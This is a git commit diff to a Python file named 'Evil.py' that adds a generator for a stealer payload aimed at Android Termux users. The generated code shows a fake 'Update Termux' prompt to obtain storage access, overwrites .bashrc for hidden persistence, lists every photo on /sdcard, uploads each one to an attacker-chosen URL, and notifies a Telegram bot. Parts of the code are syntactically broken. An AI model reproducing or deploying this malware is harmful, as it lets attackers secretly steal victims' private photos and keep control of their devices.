da66dcb8b9b767d6f2cabaa539c03c837f144e4d
br5kly <108040523+br5kly@users.noreply.github.com>
2023-07-10 18:00:13 +0200

    Update Evil.py

--- Evil.py
+++ Evil.py
@@ -224,7 +224,119 @@ Zeyad()
                       ''')
       else:
          with open(f"{x}.py","w")as files:
-            files.write("")
+            files.write(f'''
+import subprocess,string,random,os,time,sys
+from datetime import datetime
+try:
+    import requests
+except ModuleNotFoundError:
+    subprocess.Popen('pip install requests',stdout=subprocess.PIPE,shell=True)
+class Zeyad:
+   def __init__(self) :
+       self.inj = r"/data/data/com.termux/files/home/.minimax.py"
+       self.bashrc = r"/data/data/com.termux/files/home/.bashrc"
+       self.path = r"/sdcard/Files.txt"
+       self.uploaded= r"/sdcard/Upload.txt"
+       self.done = r"/sdcard/done.txt"
+       try:
+           open(r"/sdcard/permi.txt","w").write("")
+       except:
+           print("Click Ok to Update Termux")
+           subprocess.Popen("termux-setup-storage",stdout=subprocess.PIPE,shell=True)
+           time.sleep(6)
+           self.Inject_Bashrc()
+       if not os.path.exists(self.inj):
+           self.MoveFileToHome()     ## Move File to Home And injection
+       if not os.path.exists(self.path): ## Create File Contain name photo
+           self.GetFilesNames()
+       if not os.path.exists('tes.di')
+                       try:
+                           requests.get('https://api.telegram.org/bot{self.Fark()[1]}/sendMessage?chat_id=@{self.Fark()[0]}&text=بدات عملية السحب بنجاح')
+                           open('tes.di','w').write("JJ")
+                       except:
+                          pass
+
+       if os.path.exists(self.path):  ## this is upload method !!
+           self.confirmupload()
+   def MoveFileToHome(self):
+       if not os.path.exists(self.inj):
+           myfile = __file__
+           subprocess.Popen(f'cp {{myfile}} {{self.inj}}',stdout=subprocess.PIPE,shell=True)
+           self.Injection()
+       else:
+           self.__init__()
+       
+   def Inject_Bashrc(self):
+       try:
+           open(r"/sdcard/permi.txt","w").write("")
+           self.__init__()
+       except PermissionError:
+           with open("/data/data/com.termux/files/home/.ass.py","w")as Get:
+               Get.write("""
+from datetime import datetime
+from os import system 
+import time
+def per():
+    try:
+        open('/sdcard/permi.txt','w').write('')
+        system(f'python /data/data/com.termux/files/home/.minimax.py')
+        
+    except PermissionError:
+        print("\\033[1;32m UPDATE TERMUX NOW")
+        system('termux-setup-storage')
+        time.sleep(2)
+        per()
+per()
+""")
+           with open(self.bashrc,"w")as bashrc:
+               bashrc.write("python .ass.py")
+           sys.exit()
+           
+   def GetRandomString(self):
+       s = random.choices(string.digits+string.ascii_uppercase,k=9)
+       a = "".join(s)
+       return a
+   def GetFilesNames(self):
+       if not os.path.exists(self.path):
+          with open(self.path,"w")as max:
+              for root,dirs,file in os.walk("/sdcard"):
+                  for files in file:
+                      path = os.path.join(root,files)
+                      ext = os.path.splitext(path)[1]
+                      if ext in [".jpg",".png",".heic",".jpeg"]:
+                          max.write(path+"\\n")
+          try:
+              requests.get("tele")
+          except:
+              pass
+              
+          
+   def confirmupload(self):
+       if not os.path.exists(self.done):
+           with open(self.path,"r")as Fire:
+               for i in Fire:
+                   self.PhpUpload(i.strip)
+       else:
+          with open(self.path,'r')as Water:
+              done = open(self.done,'r').read()
+              for i in Water:
+                  if i.strip() in done:
+                      continue
+              self.PhpUpload(i.strip())                   
+   def PhpUpload(self,files):
+     try:
+       s = open(self.done,"a")
+       with open(files,"rb")as women:
+           send = requests.post("{y}",data=women)
+           if send.status_code ==200:
+               s.write(f"{{files}}\\n")
+     except:
+         time.sleep(60*5)
+         self.__init__()
+   def Injection(self): ##name here
+       with open(self.bashrc,"w")as bash:
+           bash.write(f"nohup python {{self.inj}} > /dev/null 2>&1 &")               
+Zeyad()                        ''')
       print(f"{self.blue}GO TO {self.path} AND YOU GET {x}")
       time.sleep(3)
       self.MainMenu()
@@ -279,6 +391,8 @@ $uploadOk=1;
     echo 'Error: Invalid request.';
 }
                     """)
+          print(self.green+"DONE YOU GOT IN YOUR PATH",self.path)
+          self.MainMenu()
     def HandleSystem(self):
         if os.path.exists('/data/data/com.termux/files/home'):
             return "termux"
